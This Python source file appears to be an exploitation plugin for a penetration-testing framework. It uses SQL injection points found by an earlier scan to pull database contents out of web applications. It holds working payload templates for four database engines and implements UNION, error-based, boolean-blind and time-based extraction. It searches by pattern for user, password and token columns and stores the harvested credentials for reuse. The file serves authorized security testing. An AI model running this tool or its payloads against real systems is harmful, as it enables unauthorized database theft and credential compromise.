"""SQL injection data extraction — leverage confirmed SQLi to extract DB contents."""

from __future__ import annotations

import logging
import re
import time
from typing import Any, ClassVar
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# DBMS-specific query fragments
DBMS_QUERIES: dict[str, dict[str, str]] = {
    "mysql": {
        "version": "VERSION()",
        "current_user": "CURRENT_USER()",
        "current_db": "DATABASE()",
        "list_dbs": (
            "SELECT schema_name FROM information_schema.schemata"
            " WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys')"
        ),
        "list_tables": (
            "SELECT table_name FROM information_schema.tables"
            " WHERE table_schema={db} ORDER BY table_name"
        ),
        "list_columns": (
            "SELECT column_name FROM information_schema.columns"
            " WHERE table_schema={db} AND table_name={tbl} ORDER BY ordinal_position"
        ),
        "concat": "CONCAT({a},0x3a,{b})",
        "limit": "LIMIT {n},1",
        "string_pos": "ASCII(SUBSTRING(({q}),{pos},1))",
        "sleep": "SLEEP({s})",
        "if_func": "IF({cond},{t},{f})",
        "comment": "-- -",
    },
    "postgresql": {
        "version": "version()",
        "current_user": "current_user",
        "current_db": "current_database()",
        "list_dbs": (
            "SELECT datname FROM pg_database"
            " WHERE datistemplate=false AND datname NOT IN ('postgres')"
        ),
        "list_tables": (
            "SELECT table_name FROM information_schema.tables"
            " WHERE table_schema='public' ORDER BY table_name"
        ),
        "list_columns": (
            "SELECT column_name FROM information_schema.columns"
            " WHERE table_name={tbl} ORDER BY ordinal_position"
        ),
        "concat": "{a}||':'||{b}",
        "limit": "LIMIT 1 OFFSET {n}",
        "string_pos": "ASCII(SUBSTRING(({q}),{pos},1))",
        "sleep": "pg_sleep({s})",
        "if_func": "CASE WHEN {cond} THEN {t} ELSE {f} END",
        "comment": "--",
    },
    "mssql": {
        "version": "@@version",
        "current_user": "SYSTEM_USER",
        "current_db": "DB_NAME()",
        "list_dbs": (
            "SELECT name FROM sys.databases"
            " WHERE name NOT IN ('master','tempdb','model','msdb')"
        ),
        "list_tables": (
            "SELECT table_name FROM information_schema.tables"
            " WHERE table_catalog={db} AND table_type='BASE TABLE'"
        ),
        "list_columns": (
            "SELECT column_name FROM information_schema.columns"
            " WHERE table_name={tbl}"
        ),
        "concat": "{a}+':'+{b}",
        "limit": "ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY",
        "string_pos": "ASCII(SUBSTRING(({q}),{pos},1))",
        "sleep": "WAITFOR DELAY '0:0:{s}'",
        "if_func": "IIF({cond},{t},{f})",
        "comment": "--",
    },
    "sqlite": {
        "version": "sqlite_version()",
        "current_user": "'N/A'",
        "current_db": "'N/A'",
        "list_dbs": "SELECT 'main'",
        "list_tables": (
            "SELECT name FROM sqlite_master WHERE type='table'"
            " AND name NOT LIKE 'sqlite_%'"
        ),
        "list_columns": "PRAGMA table_info({tbl})",
        "concat": "{a}||':'||{b}",
        "limit": "LIMIT 1 OFFSET {n}",
        "string_pos": "UNICODE(SUBSTR(({q}),{pos},1))",
        "sleep": "",
        "if_func": "CASE WHEN {cond} THEN {t} ELSE {f} END",
        "comment": "--",
    },
}

# Tables that likely contain credentials
INTERESTING_TABLES = re.compile(
    r"(user|account|admin|credential|login|member|auth|customer|employee|staff|passwd|password)",
    re.IGNORECASE,
)

# Columns that likely contain credentials
CREDENTIAL_COLUMNS = re.compile(
    r"(user|login|email|name|pass|pwd|hash|secret|token|key)",
    re.IGNORECASE,
)

# Max rows to extract per table
MAX_ROWS = 10
# Max chars for blind extraction
MAX_BLIND_LEN = 100
# Blind sleep delay
BLIND_DELAY = 3.0
# Marker for union-based detection
UNION_MARKER = "bslsk_"


class SqliExtractPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="sqli_extract",
        display_name="SQLi Data Extraction",
        category=PluginCategory.EXPLOITATION,
        description="Extract databases, tables, and credentials through confirmed SQL injection",
        depends_on=["sqli_basic"],
        produces=["sqli_extracted_data", "credentials"],
        timeout=120.0,
        risk_level="destructive",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(self.meta.name, target.host, error="HTTP client required")

        findings: list[Finding] = []
        data: dict[str, Any] = {"extracted": {}, "credentials": [], "injection_points": 0}

        # Collect confirmed SQLi from pipeline
        injections = self._collect_injections(target, ctx)
        if not injections:
            findings.append(Finding.info(
                "No confirmed SQL injection points available",
                description="sqli_basic did not find exploitable injection points",
                tags=["sqli", "extraction"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        data["injection_points"] = len(injections)

        for inj in injections:
            if ctx.should_stop:
                break
            inj_type = inj.get("type", "")
            dbms = self._normalize_dbms(inj.get("dbms", ""))

            if inj_type == "union":
                await self._extract_union(target, ctx, inj, dbms, findings, data)
            elif inj_type == "error-based" or inj_type == "header-error":
                await self._extract_error(target, ctx, inj, dbms, findings, data)
            elif inj_type == "boolean-blind":
                await self._extract_boolean(target, ctx, inj, dbms, findings, data)
            elif inj_type == "time-based":
                await self._extract_time(target, ctx, inj, dbms, findings, data)

            # One successful extraction is enough
            if data["extracted"]:
                break

        # Feed credentials to shared state
        if data["credentials"]:
            creds = ctx.state.setdefault("credentials", [])
            creds.extend(data["credentials"])

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )

    # ------------------------------------------------------------------
    # Injection collection
    # ------------------------------------------------------------------

    def _collect_injections(self, target: Target, ctx) -> list[dict]:
        """Gather confirmed injection points from sqli_basic and sqli_advanced."""
        injections: list[dict] = []
        for key in (f"sqli_basic:{target.host}", f"sqli_advanced:{target.host}"):
            result = ctx.pipeline.get(key)
            if result and result.ok:
                for test in result.data.get("sqli_tests", []):
                    injections.append(test)
        return injections

    def _normalize_dbms(self, dbms: str) -> str:
        """Normalize DBMS name to our query-map key."""
        low = dbms.lower().strip()
        if "mysql" in low or "maria" in low:
            return "mysql"
        if "postgre" in low:
            return "postgresql"
        if "mssql" in low or "microsoft" in low or "sql server" in low:
            return "mssql"
        if "sqlite" in low:
            return "sqlite"
        return "mysql"  # default fallback

    # ------------------------------------------------------------------
    # UNION-based extraction
    # ------------------------------------------------------------------

    async def _extract_union(
        self, target: Target, ctx, inj: dict, dbms: str,
        findings: list[Finding], data: dict,
    ) -> None:
        """Extract data via UNION SELECT."""
        queries = DBMS_QUERIES.get(dbms, DBMS_QUERIES["mysql"])
        comment = queries["comment"]
        columns = inj.get("columns", 0)
        url = inj.get("url", "")
        param = inj.get("param", "id")

        if not url or columns < 1:
            return

        # Find which column reflects output
        reflect_col = await self._find_reflect_column(ctx, url, param, columns, comment)
        if reflect_col < 0:
            return

        extracted: dict[str, Any] = {}

        # Step 1: version, user, database
        for label, expr in [
            ("version", queries["version"]),
            ("current_user", queries["current_user"]),
            ("current_db", queries["current_db"]),
        ]:
            if ctx.should_stop:
                break
            val = await self._union_extract_value(
                ctx, url, param, columns, reflect_col, expr, comment,
            )
            if val:
                extracted[label] = val

        # Step 2: list tables in current DB
        db_name = extracted.get("current_db", "")
        tables = await self._union_extract_list(
            ctx, url, param, columns, reflect_col,
            queries["list_tables"].replace("{db}", f"'{db_name}'" if db_name else "'%'"),
            comment, limit=20,
        )
        if tables:
            extracted["tables"] = tables

        # Step 3: find interesting tables and extract columns + rows
        interesting = [t for t in tables if INTERESTING_TABLES.search(t)]
        for tbl in interesting[:3]:
            if ctx.should_stop:
                break
            cols = await self._union_extract_list(
                ctx, url, param, columns, reflect_col,
                queries["list_columns"]
                .replace("{tbl}", f"'{tbl}'").replace("{db}", f"'{db_name}'"),
                comment, limit=30,
            )
            if cols:
                extracted.setdefault("columns", {})[tbl] = cols

            # Extract credential-like columns
            cred_cols = [c for c in cols if CREDENTIAL_COLUMNS.search(c)]
            if len(cred_cols) >= 2:
                rows = await self._union_extract_rows(
                    ctx, url, param, columns, reflect_col,
                    tbl, cred_cols[:2], dbms, comment,
                )
                if rows:
                    extracted.setdefault("rows", {})[tbl] = rows
                    self._parse_credentials(rows, cred_cols[:2], data, tbl)

        data["extracted"] = extracted
        if extracted:
            evidence_parts = []
            if "version" in extracted:
                evidence_parts.append(f"DB Version: {extracted['version']}")
            if "current_user" in extracted:
                evidence_parts.append(f"DB User: {extracted['current_user']}")
            if "current_db" in extracted:
                evidence_parts.append(f"Database: {extracted['current_db']}")
            if "tables" in extracted:
                evidence_parts.append(f"Tables ({len(extracted['tables'])}): "
                                      + ", ".join(extracted["tables"][:10]))
            if data["credentials"]:
                evidence_parts.append(f"Credentials extracted: {len(data['credentials'])}")

            findings.append(Finding.critical(
                "SQL Injection Data Extraction (UNION)",
                evidence="\n".join(evidence_parts),
                description=(
                    f"Extracted database contents via UNION-based SQLi on {url} "
                    f"parameter '{param}'"
                ),
                remediation="Use parameterized queries / prepared statements",
                tags=["sqli", "extraction", "union", dbms],
                verified=True,
            ))

    async def _find_reflect_column(
        self, ctx, url: str, param: str, columns: int, comment: str,
    ) -> int:
        """Find which UNION column reflects in the response."""
        for col_idx in range(columns):
            if ctx.should_stop:
                return -1
            cols = ["NULL"] * columns
            marker = f"{UNION_MARKER}{col_idx}"
            cols[col_idx] = f"'{marker}'"
            payload = f"' UNION SELECT {','.join(cols)}{comment}"
            try:
                test_url = self._inject_param(url, param, payload)
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=10.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
                if marker in body:
                    return col_idx
            except Exception:
                continue
        return -1

    async def _union_extract_value(
        self, ctx, url: str, param: str, columns: int,
        reflect_col: int, expr: str, comment: str,
    ) -> str:
        """Extract a single value via UNION SELECT."""
        cols = ["NULL"] * columns
        cols[reflect_col] = expr
        payload = f"' UNION SELECT {','.join(cols)}{comment}"
        try:
            test_url = self._inject_param(url, param, payload)
            async with ctx.rate:
                resp = await ctx.http.get(test_url, timeout=10.0)
                body = await resp.text(encoding="utf-8", errors="replace")
            return self._extract_from_response(body, expr)
        except Exception:
            return ""

    async def _union_extract_list(
        self, ctx, url: str, param: str, columns: int,
        reflect_col: int, query: str, comment: str, limit: int = 20,
    ) -> list[str]:
        """Extract a list of values via UNION SELECT with LIMIT/OFFSET."""
        results: list[str] = []
        for i in range(limit):
            if ctx.should_stop:
                break
            cols = ["NULL"] * columns
            cols[reflect_col] = f"({query} LIMIT 1 OFFSET {i})"
            payload = f"' UNION SELECT {','.join(cols)}{comment}"
            try:
                test_url = self._inject_param(url, param, payload)
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=10.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
                val = self._extract_from_response(body, "")
                if val and val not in results:
                    results.append(val)
                else:
                    break
            except Exception:
                break
        return results

    async def _union_extract_rows(
        self, ctx, url: str, param: str, columns: int,
        reflect_col: int, table: str, cols_to_extract: list[str],
        dbms: str, comment: str,
    ) -> list[dict[str, str]]:
        """Extract rows with credential columns from a table."""
        queries = DBMS_QUERIES.get(dbms, DBMS_QUERIES["mysql"])
        rows: list[dict[str, str]] = []
        col_a, col_b = cols_to_extract[0], cols_to_extract[1]
        concat_expr = queries["concat"].format(a=col_a, b=col_b)

        for i in range(MAX_ROWS):
            if ctx.should_stop:
                break
            union_cols = ["NULL"] * columns
            union_cols[reflect_col] = f"({concat_expr})"
            payload = (
                f"' UNION SELECT {','.join(union_cols)}"
                f" FROM {table} LIMIT 1 OFFSET {i}{comment}"
            )
            try:
                test_url = self._inject_param(url, param, payload)
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=10.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
                val = self._extract_from_response(body, "")
                if val and ":" in val:
                    parts = val.split(":", 1)
                    rows.append({col_a: parts[0], col_b: parts[1]})
                elif not val:
                    break
            except Exception:
                break
        return rows

    # ------------------------------------------------------------------
    # Error-based extraction
    # ------------------------------------------------------------------

    async def _extract_error(
        self, target: Target, ctx, inj: dict, dbms: str,
        findings: list[Finding], data: dict,
    ) -> None:
        """Extract data via error-based SQLi (extractvalue / updatexml for MySQL)."""
        queries = DBMS_QUERIES.get(dbms, DBMS_QUERIES["mysql"])
        url = inj.get("url", "")
        param = inj.get("param", "id")
        header = inj.get("header")

        if not url:
            return

        extracted: dict[str, Any] = {}

        # Extract basic info
        for label, expr in [
            ("version", queries["version"]),
            ("current_user", queries["current_user"]),
            ("current_db", queries["current_db"]),
        ]:
            if ctx.should_stop:
                break
            val = await self._error_extract_value(ctx, url, param, header, expr, dbms)
            if val:
                extracted[label] = val

        # Extract table list
        db_name = extracted.get("current_db", "")
        tables: list[str] = []
        for i in range(20):
            if ctx.should_stop:
                break
            subq = (
                queries["list_tables"]
                .replace("{db}", f"'{db_name}'" if db_name else "'%'")
                + f" LIMIT 1 OFFSET {i}"
            )
            val = await self._error_extract_value(ctx, url, param, header, f"({subq})", dbms)
            if val and val not in tables:
                tables.append(val)
            else:
                break

        if tables:
            extracted["tables"] = tables

        data["extracted"] = extracted
        if extracted:
            evidence = "\n".join(
                f"{k}: {v}" if not isinstance(v, list) else f"{k}: {', '.join(v[:10])}"
                for k, v in extracted.items()
            )
            findings.append(Finding.critical(
                "SQL Injection Data Extraction (Error-based)",
                evidence=evidence,
                description=f"Extracted DB info via error-based SQLi on {url}",
                remediation="Use parameterized queries / prepared statements",
                tags=["sqli", "extraction", "error-based", dbms],
                verified=True,
            ))

    async def _error_extract_value(
        self, ctx, url: str, param: str, header: str | None,
        expr: str, dbms: str,
    ) -> str:
        """Extract a value using error-based technique."""
        comment = DBMS_QUERIES.get(dbms, DBMS_QUERIES["mysql"])["comment"]
        if dbms == "mysql" or dbms not in DBMS_QUERIES:
            payload = (
                f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))"
                f"{comment}"
            )
        elif dbms == "postgresql":
            payload = f"' AND 1=CAST(({expr}) AS int){comment}"
        elif dbms == "mssql":
            payload = f"' AND 1=CONVERT(int,({expr})){comment}"
        else:
            payload = (
                f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))"
                f"{comment}"
            )

        try:
            if header:
                headers = {header: payload}
                async with ctx.rate:
                    resp = await ctx.http.get(url, headers=headers, timeout=10.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
            else:
                test_url = self._inject_param(url, param, payload)
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=10.0)
                    body = await resp.text(encoding="utf-8", errors="replace")

            # Extract value from error message (between ~ markers for MySQL)
            match = re.search(r"~([^~]+)~", body)
            if match:
                return match.group(1).strip()
            # PostgreSQL/MSSQL: value appears in conversion error
            match = re.search(r'(?:invalid input|converting|conversion).*?"([^"]+)"', body, re.I)
            if match:
                return match.group(1).strip()
        except Exception:
            pass
        return ""

    # ------------------------------------------------------------------
    # Boolean-blind extraction
    # ------------------------------------------------------------------

    async def _extract_boolean(
        self, target: Target, ctx, inj: dict, dbms: str,
        findings: list[Finding], data: dict,
    ) -> None:
        """Extract data via boolean-blind SQLi (response differential)."""
        queries = DBMS_QUERIES.get(dbms, DBMS_QUERIES["mysql"])
        url = inj.get("url", "")
        param = inj.get("param", "id")
        true_payload = inj.get("true", "")
        false_payload = inj.get("false", "")

        if not url or not param:
            return

        # Get baseline true/false responses
        true_len = await self._get_response_length(ctx, url, param, true_payload)
        false_len = await self._get_response_length(ctx, url, param, false_payload)
        if true_len == 0 or true_len == false_len:
            return

        extracted: dict[str, Any] = {}
        comment = queries["comment"]

        for label, expr in [
            ("version", queries["version"]),
            ("current_user", queries["current_user"]),
            ("current_db", queries["current_db"]),
        ]:
            if ctx.should_stop:
                break
            val = await self._blind_extract_string(
                ctx, url, param, expr, true_len, false_len, queries, comment,
            )
            if val:
                extracted[label] = val

        data["extracted"] = extracted
        if extracted:
            evidence = "\n".join(f"{k}: {v}" for k, v in extracted.items())
            findings.append(Finding.critical(
                "SQL Injection Data Extraction (Boolean-blind)",
                evidence=evidence,
                description=f"Extracted DB info via boolean-blind SQLi on {url}",
                remediation="Use parameterized queries / prepared statements",
                tags=["sqli", "extraction", "boolean-blind", dbms],
                verified=True,
            ))

    async def _blind_extract_string(
        self, ctx, url: str, param: str, expr: str,
        true_len: int, false_len: int, queries: dict, comment: str,
    ) -> str:
        """Extract a string character by character via boolean-blind binary search."""
        result_chars: list[str] = []
        for pos in range(1, MAX_BLIND_LEN + 1):
            if ctx.should_stop:
                break
            char_code = await self._blind_binary_search(
                ctx, url, param, queries["string_pos"].format(q=expr, pos=pos),
                true_len, false_len, queries, comment,
            )
            if char_code == 0:
                break
            result_chars.append(chr(char_code))
        return "".join(result_chars)

    async def _blind_binary_search(
        self, ctx, url: str, param: str, ascii_expr: str,
        true_len: int, false_len: int, queries: dict, comment: str,
    ) -> int:
        """Binary search for a single character's ASCII value."""
        low, high = 32, 126
        while low <= high:
            if ctx.should_stop:
                return 0
            mid = (low + high) // 2
            cond = f"{ascii_expr}>{mid}"
            payload = f"' AND {cond}{comment}"
            resp_len = await self._get_response_length(ctx, url, param, payload)
            if abs(resp_len - true_len) < abs(resp_len - false_len):
                low = mid + 1
            else:
                high = mid - 1
        return low if 32 <= low <= 126 else 0

    async def _get_response_length(
        self, ctx, url: str, param: str, payload: str,
    ) -> int:
        """Get response content length for a given payload."""
        try:
            test_url = self._inject_param(url, param, payload)
            async with ctx.rate:
                resp = await ctx.http.get(test_url, timeout=10.0)
                body = await resp.text(encoding="utf-8", errors="replace")
            return len(body)
        except Exception:
            return 0

    # ------------------------------------------------------------------
    # Time-based blind extraction
    # ------------------------------------------------------------------

    async def _extract_time(
        self, target: Target, ctx, inj: dict, dbms: str,
        findings: list[Finding], data: dict,
    ) -> None:
        """Extract data via time-based blind SQLi."""
        queries = DBMS_QUERIES.get(dbms, DBMS_QUERIES["mysql"])
        url = inj.get("url", "")
        param = inj.get("param", "id")
        comment = queries["comment"]

        if not url or not param or not queries["sleep"]:
            return

        extracted: dict[str, Any] = {}

        for label, expr in [
            ("version", queries["version"]),
            ("current_user", queries["current_user"]),
            ("current_db", queries["current_db"]),
        ]:
            if ctx.should_stop:
                break
            val = await self._time_extract_string(ctx, url, param, expr, queries, comment)
            if val:
                extracted[label] = val

        data["extracted"] = extracted
        if extracted:
            evidence = "\n".join(f"{k}: {v}" for k, v in extracted.items())
            findings.append(Finding.critical(
                "SQL Injection Data Extraction (Time-based blind)",
                evidence=evidence,
                description=f"Extracted DB info via time-based blind SQLi on {url}",
                remediation="Use parameterized queries / prepared statements",
                tags=["sqli", "extraction", "time-based", dbms],
                verified=True,
            ))

    async def _time_extract_string(
        self, ctx, url: str, param: str, expr: str,
        queries: dict, comment: str,
    ) -> str:
        """Extract a string char by char via time-based binary search."""
        result_chars: list[str] = []
        for pos in range(1, MAX_BLIND_LEN + 1):
            if ctx.should_stop:
                break
            char_code = await self._time_binary_search(
                ctx, url, param,
                queries["string_pos"].format(q=expr, pos=pos),
                queries, comment,
            )
            if char_code == 0:
                break
            result_chars.append(chr(char_code))
        return "".join(result_chars)

    async def _time_binary_search(
        self, ctx, url: str, param: str, ascii_expr: str,
        queries: dict, comment: str,
    ) -> int:
        """Binary search using time delays."""
        low, high = 32, 126
        sleep_expr = queries["sleep"].format(s=int(BLIND_DELAY))
        if_func = queries["if_func"]

        while low <= high:
            if ctx.should_stop:
                return 0
            mid = (low + high) // 2
            cond = f"{ascii_expr}>{mid}"
            delay_expr = if_func.format(cond=cond, t=sleep_expr, f="0")
            payload = f"' AND {delay_expr}{comment}"

            test_url = self._inject_param(url, param, payload)
            try:
                t0 = time.monotonic()
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=BLIND_DELAY + 10)
                    await resp.text(encoding="utf-8", errors="replace")
                elapsed = time.monotonic() - t0

                if elapsed >= BLIND_DELAY * 0.8:
                    low = mid + 1
                else:
                    high = mid - 1
            except Exception:
                return 0
        return low if 32 <= low <= 126 else 0

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a query parameter value with the payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _extract_from_response(self, body: str, _expr: str) -> str:
        """Try to extract a meaningful value from the response body.

        Looks for the UNION marker prefix or common DB output patterns.
        """
        # Look for our union marker
        match = re.search(rf"{UNION_MARKER}\d+", body)
        if match:
            # The marker itself was reflected — means this was the column-finding step
            return ""

        # Look for common patterns in reflected data
        # Remove HTML tags for cleaner extraction
        clean = re.sub(r"<[^>]+>", "\n", body)
        lines = [ln.strip() for ln in clean.split("\n") if ln.strip()]

        # Look for lines that look like DB output (not HTML/JS)
        for line in lines:
            if len(line) > 200:
                continue
            # Skip obvious HTML/JS/CSS
            if re.match(r"^[{}\[\]<>;/]", line):
                continue
            # Version strings
            if re.search(r"\d+\.\d+\.\d+", line) and len(line) < 100:
                return line
            # Database/table names
            if re.match(r"^[\w_.-]+$", line) and 2 < len(line) < 60:
                return line
        return ""

    def _parse_credentials(
        self, rows: list[dict[str, str]], cols: list[str], data: dict, table: str,
    ) -> None:
        """Parse extracted rows into credential format."""
        for row in rows:
            cred: dict[str, str] = {
                "source": f"sqli_extract:{table}",
                "verified": "false",
            }
            for col in cols:
                val = row.get(col, "")
                if not val:
                    continue
                col_lower = col.lower()
                if any(k in col_lower for k in ("user", "login", "name", "email")):
                    cred["username"] = val
                elif any(k in col_lower for k in ("pass", "pwd", "hash", "secret")):
                    cred["password"] = val
            if "username" in cred or "password" in cred:
                data["credentials"].append(cred)
